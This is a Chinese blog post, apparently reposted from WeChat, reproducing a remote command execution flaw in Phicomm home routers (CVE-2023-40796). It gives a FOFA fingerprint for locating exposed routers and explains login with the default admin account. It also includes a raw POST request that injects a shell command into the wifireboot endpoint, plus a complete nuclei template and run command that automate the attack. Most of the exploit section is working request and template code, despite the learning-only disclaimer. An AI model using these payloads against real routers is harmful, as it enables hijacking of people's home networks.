<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wc6pRvxcB-Rp6jfrrd7x7A)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

斐讯 Phicomm 路由器 RCE 漏洞

02

—  

漏洞影响

Phicomm 路由器

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6eGXKf1AwlAVliaicQwNyCEtZyccChdzoZySicKOnic2x72g6qBoiba737J6w/640?wx_fmt=png)

03

—  

漏洞描述

斐讯 Phicomm 路由器是一款流行的家用路由器，默认登陆页面只有用户名，默认账号为 admin，该路由器后台管理界面存在远程命令执行漏洞。

  

04

—  

FOFA 搜索语句

```
icon_hash="-1344736688"

```

‍‍

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6ePjUaxCAHvqcRV82QvrSW6W2oYOOFx6Qq0SlojKdJ1sbsv2ibmzGeVYg/640?wx_fmt=png)

05

—  

漏洞复现

第一步，使用 admin 账号登陆，获取 cookie

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6ef6Hc9O2eY3g8Beda58RJfkEC4eQib8KLAQXPP3nEhhEbjFUfVrWuImw/640?wx_fmt=png)

第二步，发送如下数据包，在目标机器上执行 id 命令（POC14 行）  

```
POST /cgi-bin/luci/;stok=bcd6ccd2fa5d212ce6431ca22f10b96d/admin/wifireboot HTTP/1.1
Host: x.x.x.x
Cookie: sysauth=第一步登录获取的cookie
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxbgjoytz
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
%s
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
12:00; id;
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
%s:
------WebKitFormBoundaryxbgjoytz
Content-Disposition: form-data; 
------WebKitFormBoundaryxbgjoytz--

```

其中路径中 stok 和 Cookie 的值从第一步获取

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6e7HSAtaF7PoF4Q6DicCxlctctxUvHLQGr3LbIjrlkicAXia4AiaHbVcK1Fg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BN9kicv5AxlAWayltvKKSl6eXpTLWXyW91X2617FnfPibEh7AvUT14y91gV4bbVc1bsFdefW4n2NYRg/640?wx_fmt=png)

证明存在漏洞

06

—  

nuclei poc

关注公众号，**回复** **0015** **获取 poc 源文件**。

poc 文件内容如下

```
id: CVE-2023-40796
info:
  name: 斐讯 Phicomm 路由器后台命令执行
  author: fgz
  severity: high
  description: |
    斐讯Phicomm路由器是一款流行的家用路由器，默认登陆页面只有用户名，默认账号为admin，该路由器后台管理界面存在远程命令执行漏洞。
  reference:
    None
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-1344736688"
  tags: rce
http:
  - raw:
      - |
        POST /cgi-bin/luci/admin/login HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Opera/8.16.(X11; Linux i686; nn-NO) Presto/2.9.183 Version/12.00
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 278
        Content-Type: application/x-www-form-urlencoded
        action_mode=apply&action_url=\{\{BaseURL\}\}/cgi-bin/luci/admin/login&username=admin&password=YWRtaW4=
      - |
        POST \{\{replace(api,'index','wifireboot')\}\} HTTP/1.1
        Host: \{\{Hostname\}\}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxbgjoytz
        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        %s
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        12:00; id;
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        %s:
        ------WebKitFormBoundaryxbgjoytz
        Content-Disposition: form-data; 
        ------WebKitFormBoundaryxbgjoytz--
    cookie-reuse: true
    extractors:
      - type: kval
        name: api
        internal: true
        part: header
        kval:
          - Location
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains((body_2), 'uid') && contains((body_2), 'gid')"
        condition: and

```

运行 POC

```
.\nuclei.exe -t .\CVE-2023-40796.yaml -u http://x.x.x.x:30005

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOyvuDVu19tElwp2MufhD6sKibQzZiaXRjkj9JoJSibqXKJQB8GwtWqHVQcBz84RxXgIslEOU07N3UaQ/640?wx_fmt=png)